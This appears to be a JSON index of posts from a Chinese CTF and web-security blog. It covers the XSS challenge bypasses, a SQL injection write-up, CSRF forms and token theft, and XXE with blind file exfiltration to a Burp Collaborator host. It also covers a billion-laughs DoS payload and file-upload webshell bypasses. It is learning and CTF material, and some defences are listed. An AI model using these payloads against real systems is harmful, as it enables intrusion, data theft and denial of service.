&#x27;1&#x27;*(i+1)), &#x27;2&#x27;*(i+1))+cipher[i+1:] print aes.decrypt(ct) 运行结果如下 总结虽然名字叫做”CBC字节反转攻击”，但并不是只有CBC模式才会有这种攻击手法，CFB和OFB模式都是不能抵御这种攻击的，不能认为如果不用CBC模式以后就能完全避免这种密文重放攻击了。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://0xr1ngs.github.io/categories/Crypto/"}],"tags":[{"name":"cbc","slug":"cbc","permalink":"https://0xr1ngs.github.io/tags/cbc/"}]},{"title":"xss总结","slug":"xss","date":"2018-08-21T06:02:19.000Z","updated":"2023-07-10T09:15:17.488Z","comments":true,"path":"2018/08/21/xss/","link":"","permalink":"https://0xr1ngs.github.io/2018/08/21/xss/","excerpt":"","text":"在进行haozi师傅的XSS过关挑战中学到了不少东西，参考了学长的wp，发出来总结一下 题目链接 0x001&lt;script&gt;alert(1)&lt;/script&gt; 最简单的 0x011&lt;/textarea&gt;&lt;script&gt;alert(1)&lt;/script&gt; 闭合标签 0x021&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot; 原理同上 0x031&lt;script&gt;alert`1`&lt;/script&gt; 这道题waf了小括号 可以用反引号绕过 0x04这道题卡了好久，先来看看server code 12345function render (input) &#123; const stripBracketsRe = /[()`]/g input = input.replace(stripBracketsRe, &#x27;&#x27;) return input&#125; g表示全局匹配，将反引号或 (或 )替换成空这样的话只能考虑一下编码绕过我一开始的想法是使用js编码，但实际测试是不行的在学长的wp下面发现了这篇文章，抢救了我对编码知识的盲区浅谈XSS—字符编码和浏览器解析原理文中不同的标签浏览器的解析顺序不同，开头和结尾各给了几个例子原理是因为：小括号、单引号、双引号这些控制字符在js解码的时候仅仅会被解码为文本字符串而只有标识符名称不会被当做字符串，所以不能弹窗这道题有两种办法绕过 &lt;img src=1 onerror=alert&amp;#40;1&amp;#41;&gt; &lt;svg&gt;&lt;script&gt;alert&amp;#40;1&amp;#41;&lt;/script&gt;&gt; 其实两种方法原理都差不多，先来说第一种吧我们前面已经说到过js编码不能绕过过滤的()，所以只能想其他的编码方式而这里使用的是HTML编码，因为我发现在 &lt;script&gt;标签里面的HTML编码是不能被浏览器解析的而这里由于是在img标签内，可以解析HTMl编码，所以还原除了小括号，然后执行了js代码第二个payload其实原理相同，也是svg标签可以HTML编码的原理 0x051--!&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!-- 这道题考察了html注释符后面的感叹号可有可无 0x06先看看server code 1234function render (input) &#123; input = input.replace(/auto|on.*=|&gt;/ig, &#x27;_&#x27;) return `&lt;input value=1 $&#123;input&#125; type=&quot;text&quot;&gt;`&#125; 这里要注意 |是或的意思，有整体分割的作用，匹配auto或者on.*&#x3D;或者&gt;而且全局匹配且不区分大小写，那么闭合标签和auto事件就不能用了然而正则里面的 .是匹配除”\\n”之外的任何单个字符，所以我们使用换行就可以绕过了 12onmouseover=alert(1) 0x07server code: 123456function render (input) &#123; const stripTagsRe = /&lt;\\/?[^&gt;]+&gt;/gi input = input.replace(stripTagsRe, &#x27;&#x27;) return `&lt;article&gt;$&#123;input&#125;&lt;/article&gt;`&#125; 再讲讲正则，首先匹配一个 &lt;然后 /有或者没有都可以，再去匹配除了 &gt;的任意字符一个或多个，再以 &gt;结尾这样的话可以利用浏览器的容错性，实际上如果你img标签没有闭合的话浏览器也是可以正常执行的 1&lt;img src=1 onerror=alert(1) 而又由于这里的img标签又在article标签中，而且在同一行，所以需要在结尾加上一个空格或者回车浏览器才能正常执行 0x08server code: 12345678function render (src) &#123; src = src.replace(/&lt;\\/style&gt;/ig, &#x27;/* \\u574F\\u4EBA */&#x27;) return ` &lt;style&gt; $&#123;src&#125; &lt;/style&gt; `&#125; 题目的想法也就是不想让你闭合style标签这里的技巧是利用在标签结尾的地方增加空格或者使用回车不影响解析 12345678&lt;/style &gt;&lt;script&gt;alert(1)&lt;/script&gt;或者&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt; 0x09server code: 1234567function render (input) &#123; let domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) &#123; return `&lt;script src=&quot;$&#123;input&#125;&quot;&gt;&lt;/script&gt;` &#125; return &#x27;Invalid URL&#x27;&#125; 由于正则只匹配开头而没有匹配结尾，导致后面可以继续植入代码可以先闭合前面的双引号，在后面js标签中再用 //注释掉后面的双引号 1https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)// 当然也可以用onload事件 1https://www.segmentfault.com&quot; onload = alert(1) &quot; 0x0Aserver code: 12345678910111213141516function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, &#x27;&amp;&#x27;) .replace(/&#x27;/g, &#x27;&#x27;&#x27;) .replace(/&quot;/g, &#x27;&quot;&#x27;) .replace(/&lt;/g, &#x27;&lt;&#x27;) .replace(/&gt;/g, &#x27;&gt;&#x27;) .replace(/\\//g, &#x27;/&#x27;) &#125; const domainRe = /^https?:\\/\\/www\\.segmentfault\\.com/ if (domainRe.test(input)) &#123; return `&lt;script src=&quot;$&#123;escapeHtml(input)&#125;&quot;&gt;&lt;/script&gt;` &#125; return &#x27;Invalid URL&#x27;&#125; 由于这道题目和上一题很像，所以我一开始想到的是闭合双引号，但是在标签的属性值里HTML对双引号编码是无效的，只会当作普通文本，所以只能另外想办法比较好的办法是去引用外部js代码，不过我倒是搜出来很多奇怪的技巧，有用@的（不知道有没有这个方法），有去新注册一个国家级域名的，不过比较好的还是就地取材：在目标url里是一个论坛网站，可以新建一个笔记，内容为 alert(1)然后点击raw功能，引入这个文件就可以了还有一个坑点在于这个替换规则没有使用 ;导致 /在编码的时候和后面的数字连在一起成了不可见字符无法识别url在浏览器里按下F12就能看到详细错误链接被识别为了 https://segmentfault.com/n%EF%BF%BD/raw解决的办法也很简单，加上 ;或者使用换行 123https://www.segmentfault.com/n/;1330000016099466/rawhttps://www.segmentfault.com/n/1330000016099466/raw 0x0Bserver code: 1234function render (input) &#123; input = input.toUpperCase() return `&lt;h1&gt;$&#123;input&#125;&lt;/h1&gt;`&#125; 这道题的考点在于HTML的标签（包括script）不区分大小写，但是js的函数是区分的正解是用编码绕过，或者引入外部js文件一开始想的是js编码，但是很遗憾 U大写后识别不出来，只能用没有大小写区分的HTML编码 12&lt;/h1&gt;&lt;img src=1 onerror = alert(1)&gt;&lt;script src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt; 0x0Cserver code: 12345678function render (input) &#123; input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) return ` &lt;script&gt; // alert(&#x27;$&#123;input&#125;&#x27;) &lt;/script&gt; `&#125; 和上面一题一样，不能用script，但是由于这里的替换只替换了一次，而且是替换字符串并且替换为空，所以可以用双写绕过 12&lt;/h1&gt;&lt;img src=1 onerror = alert(1)&gt;&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt; 0x0Dserver code: 12345678function render (input) &#123; input = input.replace(/[&lt;/&quot;&#x27;]/g, &#x27;&#x27;) return ` &lt;script&gt; // alert(&#x27;$&#123;input&#125;&#x27;) &lt;/script&gt; `&#125; 首先这里双斜线只能注释单行，回车就可以绕过，还剩下的 &#39;)可以用HTML的注释符 --&gt;饶过这是一个技巧，js里面同样可以用HTML的注释符，各自用一半均有注释一行的效果，而使用 --&gt;的时候前面不能有东西，否则会语法报错 123alert(1)--&gt; 0x0Eserver code: 12345function render (input) &#123; input = input.replace(/&lt;([a-zA-Z])/g, &#x27;&lt;_$1&#x27;) input = input.toUpperCase() return &#x27;&lt;h1&gt;&#x27; + input + &#x27;&lt;/h1&gt;&#x27;&#125; 这道题将返回的第一个匹配（$1）替换成 &lt;_，首先想到的当然还是编码，我想用HTML编码 img但是后来发现并不行，标签名编码没有用这道题用到的是古英语，ſ大写过后即是 S 1&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/script&gt; 0x0Fserver code: 1234567891011function render (input) &#123; function escapeHtml(s) &#123; return s.replace(/&amp;/g, &#x27;&amp;&#x27;) .replace(/&#x27;/g, &#x27;&#x27;&#x27;) .replace(/&quot;/g, &#x27;&quot;&#x27;) .replace(/&lt;/g, &#x27;&lt;&#x27;) .replace(/&gt;/g, &#x27;&gt;&#x27;) .replace(/\\//g, &#x27;/&#x27;) &#125; return `&lt;img src onerror=&quot;console.error(&#x27;$&#123;escapeHtml(input)&#125;&#x27;)&quot;&gt;`&#125; 这里对上述符号均进行的是HTML编码，并没有什么屌用，浏览器解析的时候会还原出来，直接闭合就好了 1&#x27;);alert(&#x27;1 0x10不懂这道题的意义，直接弹 11;alert(1) 0x11server code: 123456789101112131415161718192021222324252627282930// from alf.nufunction render (s) &#123; function escapeJs (s) &#123; return String(s) .replace(/\\\\/g, &#x27;\\\\\\\\&#x27;) .replace(/&#x27;/g, &#x27;\\\\\\&#x27;&#x27;) .replace(/&quot;/g, &#x27;\\\\&quot;&#x27;) .replace(/`/g, &#x27;\\\\`&#x27;) .replace(/&lt;/g, &#x27;\\\\74&#x27;) .replace(/&gt;/g, &#x27;\\\\76&#x27;) .replace(/\\//g, &#x27;\\\\/&#x27;) .replace(/\\n/g, &#x27;\\\\n&#x27;) .replace(/\\r/g, &#x27;\\\\r&#x27;) .replace(/\\t/g, &#x27;\\\\t&#x27;) .replace(/\\f/g, &#x27;\\\\f&#x27;) .replace(/\\v/g, &#x27;\\\\v&#x27;) // .replace(/\\b/g, &#x27;\\\\b&#x27;) .replace(/\\0/g, &#x27;\\\\0&#x27;) &#125; s = escapeJs(s) return `&lt;script&gt; var url = &#x27;javascript:console.log(&quot;$&#123;s&#125;&quot;)&#x27; var a = document.createElement(&#x27;a&#x27;) a.href = url document.body.appendChild(a) a.click()&lt;/script&gt;`&#125; 要看懂题目，这里替换的字符串里的“两个反斜线”其实是指替换成一个反斜线，因为还要起到一个转义的作用先看payload： 1&quot;);alert(&quot;1 主要原因如下： \\本身是作为转义符号的，转义后面紧接的字符，有的字符转义会变成其他具体含义，像 \\n之类的，&quot;被转义他仍是双引号，只是在当前失去意义而已，而这里由于外面包裹的是单引号，里面的内容被认为是一个字符串，双引号本身就没有实际含义，所以这里使用 \\&quot;其实是没有用的，而在后面被拼接到href后，就会发挥双引号作用 如果截图浏览器Element选项就能看到a标签： 0x12server code: 12345// from alf.nufunction escape (s) &#123; s = s.replace(/&quot;/g, &#x27;\\\\&quot;&#x27;) return &#x27;&lt;script&gt;console.log(&quot;&#x27; + s + &#x27;&quot;);&lt;/script&gt;&#x27;&#125; 只替换一次，自己再加上一个反斜线转义前面的反斜线即可 1\\&quot;);alert(1)// 总结还是学到了些东西，尤其是正则的匹配以及编码的知识 参考文章haozi&#x2F;xss-demo 在线做题笔记新的xss挑战","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://0xr1ngs.github.io/tags/xss/"}]},{"title":"实验吧-因吹斯汀的绕过-writeup","slug":"interesting","date":"2018-07-12T12:10:50.000Z","updated":"2023-07-10T09:16:45.385Z","comments":true,"path":"2018/07/12/interesting/","link":"","permalink":"https://0xr1ngs.github.io/2018/07/12/interesting/","excerpt":"","text":"payload11&#x27; or 1=1 group by pwd with rollup limit 1 offset 2 # 后台核心代码123456789101112131415$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)&quot;;mysql_select_db($db, $con);$sql=&quot;SELECT * FROM interest WHERE uname = &#x27;&#123;$_POST[&#x27;uname&#x27;]&#125;&#x27;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key[&#x27;pwd&#x27;] == $_POST[&#x27;pwd&#x27;]) &#123; print &quot;CTF&#123;XXXXXX&#125;&quot;; &#125;else&#123; print &quot;亦可赛艇！&quot;; &#125;&#125;else&#123; print &quot;一颗赛艇！&quot;;&#125; 带入uname的值查询 如果查询结果的行的数目为1的话（查询成功）继续执行,如果输入的pwd和查询的pwd相同的话输出flag 本地测试1234567891011121314151617181920mysql&gt; select * from demo where password = &#x27;&#x27; or 1=1;+-------+----------+------+| name | password | id |+-------+----------+------+| admin | admin888 | 1 || user1 | pass2 | 2 || user2 | pass3 | 3 |+-------+----------+------+3 rows in set (0.00 sec)mysql&gt; select * from demo where password = &#x27;&#x27; or 1=1 group by password with rollup;+-------+----------+------+| name | password | id |+-------+----------+------+| admin | admin888 | 1 || user1 | pass2 | 2 || user2 | pass3 | 3 || user2 | NULL | 3 |+-------+----------+------+4 rows in set (0.00 sec) or 1&#x3D;1可以返回所有的结果，而如果查询的结果超过两行，with rollup就会多返回一行，并且password（由group by 决定）为NULL，再加入limit 1就可以只返回一行，而用offset，表示返回哪一行，null结果是在最后一行插入的，所以offset要指向最后一行，但我们并不知道最后一行的行数是几，所以用二分法测试 超过行数的话就会返回empty set，也就是没有返回一行而查询失败，所以只要测试出最后null的行数，此时查询成功返回的就是任意的一个uname和password为NULL的结果，此时密码一项不填为空，null和null相等就可以得到flag 12345678mysql&gt; select * from demo where password = &#x27;&#x27; or 1=1 group by password with rolluplimit 1 offset 3;+-------+----------+------+| name | password | id |+-------+----------+------+| user2 | NULL | 3 |+-------+----------+------+1 row in set (0.00 sec)","categories":[{"name":"CTF","slug":"CTF","permalink":"https://0xr1ngs.github.io/categories/CTF/"}],"tags":[{"name":"sqli","slug":"sqli","permalink":"https://0xr1ngs.github.io/tags/sqli/"}]},{"title":"csrf","slug":"csrf","date":"2018-06-09T09:18:33.000Z","updated":"2023-07-10T09:13:12.507Z","comments":true,"path":"2018/06/09/csrf/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/09/csrf/","excerpt":"","text":"请求方式get利用html里的带src属性的元素发出跨域请求 123456789&lt;link href=&quot;url&quot;&gt;&lt;img src=&quot;url&quot;&gt;&lt;iframe src=&quot;url&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0&quot;;url=&quot;url&quot;&gt;&lt;script src=&quot;url&quot;&gt;&lt;video src=&quot;url&quot;&gt;&lt;audio src=&quot;url&quot;&gt;&lt;a href=&quot;url&quot;&gt;&lt;table background=&quot;url&quot;&gt; post1234567&lt;form method=&quot;POST&quot; id=&quot;hack&quot; action=&quot;url&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;passwd_new&quot; value=&quot;csrf&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;passwd_conf&quot; value=&quot;csrf&quot;&gt;&lt;/form&gt;&lt;script&gt; document.getElementById(&quot;hack&quot;).submit();&lt;/script&gt; 防御方法验证referer data:协议访问和https向http跳转时候referer为空 把文件放在一个GOOGLE.COM的目录，绕过关键字验证 使用验证码影响用户体验 使用csrf token攻击者无法使用js获取外域页面的token值，遵循同源策略 配合xss攻击如果网站还存在着一个xss漏洞，可以用xss窃取同域的csrftoken然后发起csrf攻击可以在有xss漏洞的页面嵌入以下代码 123&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value)&gt;&lt;!--成功--&gt;&lt;iframe src=&quot;../csrf&quot; onload=window.open(&quot;../csrf/?password_new=admin&amp;password_conf=admin&amp;Change=Change&amp;user_token=&quot;+frames[0].document.getElementsByName(&#x27;user_token&#x27;)[0].value+&quot;#&quot;)&gt;&lt;!--失败 报错csrf token is incorrect 用window.open重新打开一个以面后token刷新了--&gt; 没有过滤script关键字 123456789101112131415&lt;script&gt; var frameObj = document.createElement(&quot;iframe&quot;); frameObj.setAttribute(&quot;id&quot;, &quot;add&quot;); document.body.appendChild(frameObj); document.getElementById(&quot;add&quot;).src = &quot;admin.php?c=admin&amp;f=save&quot;; var token = document.getElementById(&quot;add&quot;).contentWindow.document.getElementById(&quot;token&quot;).value; //从iframe中的页面中获取token值 var xmlhttp; if (window.XMLHttpRequest) &#123; // code for IE7+, Firefox, Chrome, Opera, Safari xmlhttp = new XMLHttpRequest(); &#125; else &#123; // code for IE6, IE5 xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;); &#125; xmlhttp.open(&quot;POST&quot;, &quot;admin.php?c=admin&amp;f=save&quot;, true); xmlhttp.send(&quot;id=1&amp;accont=wooyun&amp;pass=123456&amp;status=1&amp;if_system=1&amp;token=&quot;+token); //带上token提交添加管理员的请求&lt;/script&gt; 过滤关键字，加载远程的js代码 1234&lt;img src=1 onerror=document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;url&#x27;&gt;&lt;object data=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovL3h4eC54eHgvYS5qcz48L3NjcmlwdD4=&quot;&gt;&lt;/iframe&gt;&lt;script src=http://xxx.xxx/a.js&gt;&lt;/script&gt;","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"csrf","slug":"csrf","permalink":"https://0xr1ngs.github.io/tags/csrf/"}]},{"title":"xxe总结","slug":"xxe","date":"2018-06-02T11:12:55.000Z","updated":"2023-07-10T09:15:33.882Z","comments":true,"path":"2018/06/02/xxe/","link":"","permalink":"https://0xr1ngs.github.io/2018/06/02/xxe/","excerpt":"","text":"xmlxml是一种标记语言，设计宗旨是传输数据，需要自定义标签，他仅仅是纯文本而已 1234567891011121314&lt;?xml version=&quot;1.0&quot;?&gt; xml声明&lt;!DOCTYPE note [ 内部的dtd 被包装在一个doctype声明中 &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; 根元素 必须有 &lt;to&gt;George&lt;/to&gt; 4个子元素 子元素还可以有子元素 &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;&lt;/note&gt; dtd 文档类型定义dtd的作用是定义xml文档的合法构建模块 内部dtd可被成行地声明于xml文档中，也可以作为一个外部引用 1234567&lt;!DOCTYPE note [ 定义此文档是note类型的文档 &lt;!ELEMENT note (to,from,heading,body)&gt; 定义note元素有四个子元素 &lt;!ELEMENT to (#PCDATA)&gt; 定义元素 类型为&quot;#PCDATA&quot; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt; 外部dtd如果部署在外部，则应该这样声明 123456789101112131415&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;&lt;note&gt;&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;&lt;/note&gt; 外部的note.dtd文件 &lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; 实体实体是用于定义引用普通文本或特殊字符的快捷方式的变量实体可以在内部或者外部声明 内部实体一个实体由一个&amp;，一个实体名称，一个;构成 12&lt;!ENTITY writer &quot;r1ngs&quot;&gt; 在dtd里声明 &lt;author&gt;&amp;writer;&lt;/author&gt; xml里引用 外部实体12&lt;!ENTITY writer SYSTEM &quot;url&quot;&gt;&lt;author&gt;&amp;writer;&lt;/author&gt; 参数实体仅仅在dtd中使用的解析实体为参数实体 12&lt;!ENTITY % writer &quot;r1ngs&quot;&gt; 内部 &lt;!ENTITY % writer SYSTEM &quot;url&quot;&gt; 外部 在dtd内引用： %writer; 漏洞利用php里的simplexml_load_string在旧版本里默认解析外部实体 如果网站解析的xml是外部可控的，或者在与服务器交互的时候将json数据格式改为xml，都可能会导致服务器解析恶意的xml脚本 读取文件&#x2F;&#x2F;不同程序支持协议不一样 读取失败的时候可以考虑php:&#x2F;&#x2F;filter12345&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;]&gt;&lt;aaa&gt;&amp;xxe;&lt;/aaa&gt; 没有数据回显的时候有的解析器不能在实体定义的时候引用参数实体，所以要把声明放到攻击者的服务器漏洞复现： 1234567891011121314151617181920&lt;?php header(&quot;Content-type: text/html; charset=utf-8&quot;); echo &quot;&lt;h3&gt;xxe test！&lt;/h3&gt;&quot;; $xml = &#x27;&lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM &quot;http://192.168.41.1:81/evil.dtd&quot;&gt; %remote; %param1;]&gt; &lt;root&gt;&amp;external;&lt;/root&gt;&#x27;; try&#123; $doc = simplexml_load_string($xml); &#125; catch(Exception $e)&#123; print &quot;error&quot;; &#125; ?&gt;远程的dtd文件&lt;!ENTITY % payload SYSTEM &quot;php://filter/convert.base64-encode/resource=1.txt&quot;&gt; &lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &#x27;http://192.168.41.1:81/1.php?file=%payload;&#x27;&gt;&quot;&gt; dos攻击1234567891011121314&lt;?xml version = &quot;1.0&quot;?&gt; &lt;!DOCTYPE lolz [&lt;!ENTITY lol &quot;lol&quot;&gt; &lt;!ENTITY lol1 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt; &lt;!ENTITY lol2 &quot;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&quot;&gt; &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt; &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt; &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt; &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt; &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt; &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt; &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;]&gt; &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt; 还有执行系统命令，探测内网端口等效果 防御 禁止使用外部实体 12345678910PHP：libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤用户提交的xml数据 赛总♂牛逼在写这篇文章的时候翻了一下之前和赛总的聊天记录，赛总之前教了我一个没有vps也能实现blind xxe的黑魔法 burp collaborator clientburp里的这个功能可以随机生成一条由burp.collaborator.server分给你的链接，任何访问了这个链接的请求都会被记录下来，当关掉这个面板的时候链接失效 githubgithub上可以托管代码文件，raw功能预览代码，此时url就可以作为远程文件的链接 1https://raw.githubusercontent.com/R1ng6/CTFtool/master/evil.dtd 但是当时我找了一个普通的xxe的ctf题目，发现调用参数实体的时候无法访问dtd文件里面指向的collaborator链接后来发现是默认不支持协议github上的链接是https协议，php默认不支持 搭博客，买域名正好之前用github搭建了博客，还买了域名进行重定向，用域名访问博客地址就是http协议，于是我马上试了一下在靶机里面的xml 123456$xml = &#x27;&lt;!DOCTYPE ANY [ &lt;!ENTITY % remote SYSTEM &quot;http://r1ngs.top/test.dtd&quot;&gt; %remote; %param1;]&gt; &lt;root&gt;&amp;external;&lt;/root&gt;&#x27;; github上的dtd 12&lt;!ENTITY % payload SYSTEM &quot;php://filter/convert.base64-encode/resource=1.txt&quot;&gt; &lt;!ENTITY % param1 &quot;&lt;!ENTITY external SYSTEM &#x27;http://xcd123kik2apvsgubws336a9107qvf.burpcollaborator.net/?flag=%payload;&#x27;&gt;&quot;&gt; 只是不知道为什么github上只能命名为dtd，如果是xml的话访问链接会报404最后成功读取到了靶机目录下的1.txt文件","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"https://0xr1ngs.github.io/tags/xxe/"}]},{"title":"文件上传","slug":"file-upload","date":"2018-05-31T13:11:43.000Z","updated":"2023-07-10T09:13:33.044Z","comments":true,"path":"2018/05/31/file-upload/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/31/file-upload/","excerpt":"","text":"客户端检验一般使用js代码检验后缀名可以先命名为jpg然后再抓包更改为php上传或者直接禁用js 服务端 将文件后缀名改为1.aaaaa这种不存在的文件 如果正常上传，说明黑名单规则 反之白名单规则 黑名单拓展名黑名单绕过在黑名单里设有php,php2,php3.phtml等 可以用evil.Php.aaa，apache如果解析不了.aaa拓展名，会继续向前寻找可以解析的拓展名 尝试大小写绕过或者找拓展名的漏网之鱼 1234jsp：jspx、jspf；asp：asa、cer、aspx；php：php、php2、php3、php4、php5、phps、pht、phtm、phtml；exe：exee 白名单0x01 content-type文件类型 抓包的时候改为image&#x2F;gif0x02 文件头绕过 在文件头加上文件信息，比如 1GIF89a&lt;?php phpinfo();?&gt; %00截断00在ascii里表示NULL，当系统读取到0x00时认为文件名已经结束 通过抓包将evil.php1.jpg的1换成0x00从而上传evil.php 也可以是路径&#x2F;upload&#x2F;1.php(0x00) 文件名1.jpg 结合后为&#x2F;upload&#x2F;1.php(0x00)&#x2F;1.jpg存入 重写解析规则上传.htaccess文件，重写解析规则，将图片用脚本方式解析在可以上传.htaccess文件时上传这个文件，文件内容如下,然后再上传evil.gif就可以让它以php方式解析 123&lt;FilesMatch &quot;evil.gif&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ADS流文件ADS是NTFS磁盘格式的一个特性。在NTFS文件系统下，每个文件都可以存在多个数据流，即除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。 上传1.php文件的时候改包为1.php:1.jpg即就是上传一个1.jpg的内容为上传前的1.php的内容的数据流文件，且与宿主文件1.php关联。 最后上传到服务器的是1.php文件，文件内容为空，在目录下使用命令 1notepad 1.php:1.jpg 就可以看到1.jpg文件的内容即之前的1.php的内容可以再结合文件包含把1.php:1.jpg包含进来，达到代码执行的作用 :$DATA默认数据流 NTFS文件系统包含对备用数据流的支持，备用数据流允许文件包含多个数据流。每个文件至少有一个数据流，windows中的默认数据流就是:$DATA 121.php::$DATA 生成1.php &lt;?php phpinfo();?&gt;1.php::$INDEX_ALLOCATION 生成1.php文件夹 windows系统windows系统不允许文件名包含下列任何字符 1/\\:*?&lt;&gt;|&quot; 可以在发包的时候改为1.php&#x2F;1.jpg上传的时候会自动删除不规范字符后面的内容，但是文件内容为空如果服务器使用黑名单的思想去校验我们可以覆盖文件内容，并且没有重命名文件，那么就可以再次上传覆盖由windows搜索文件名的特性: &lt; 符号可以匹配任意字符如果我们的文件为1.php，那么再上传一个1.&lt;&lt;&lt;，内容为webshell，那么就可以把webshell写入1.php了补充： php对文件做处理的函数使用的时候会调用一个windows的底层api 使用 &lt;可以匹配任意单字符，&lt;&lt;则可以匹配任意字符，相当于正则表达式里的 .+ linux系统尝试大小写绕过","categories":[{"name":"Web","slug":"Web","permalink":"https://0xr1ngs.github.io/categories/Web/"}],"tags":[{"name":"文件上传","slug":"文件上传","permalink":"https://0xr1ngs.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]},{"title":"sql注入总结","slug":"sql","date":"2018-05-26T09:18:33.000Z","updated":"2023-07-10T09:15:04.977Z","comments":true,"path":"2018/05/26/sql/","link":"","permalink":"https://0xr1ngs.github.io/2018/05/26/sql/","excerpt":"","text":"思路0x01 参数包裹测试 121 &#x27; &quot; ( &#123; 0x02 测试WAF测试空格 uname&#x3D;adm in 和uname&#x3D;admin 有没有被过滤为空用burp里的intruder功能fuzz单字符，字典包含所有的字符标点，–+等 1id=1$&#x27;$ 测试关键字waf，and，select等 1id=1$and$ 依据有差别的注入点，测试替换 1id=-1&#x27; or &#x27;&#x27;=&#x27;$and$ /*测试有没有被替换为空等*/ 0x03 测试payload根据被waf的关键字和测试出的能被绕过的关键字去构造payload，确定注入的类型，再用脚本 注入类型0x01 联合查询（有数据回显的时候）获取字段数 12id=1&#x27; order by 3 --+id=1&#x27; union select 1,2,3--+ payload: 1234id=1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+id=1&#x27; union select 